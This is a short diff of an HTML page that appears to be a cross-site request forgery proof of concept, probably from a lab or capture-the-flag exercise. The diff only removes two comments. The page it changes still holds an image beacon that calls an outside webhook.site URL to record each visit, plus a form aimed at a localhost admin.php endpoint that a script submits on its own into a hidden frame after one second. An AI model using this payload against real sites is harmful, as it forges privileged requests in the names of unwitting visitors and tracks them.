@@ -4,7 +4,6 @@
   <meta charset="utf-8">
 </head>
 <body>
-  <!-- Beacon to confirm visit -->
   <img src="https://webhook.site/bb019f0d-32f0-4ed4-bc65-b29a133afa26/beacon">
 
   <form id="f" action="http://localhost:5000/admin.php" method="POST" target="hiddenFrame">
@@ -23,7 +22,6 @@
 
   <script>
     setTimeout(() => {
-      // Auto-submit the form
       document.getElementById('f').submit();
     }, 1000);
   </script>
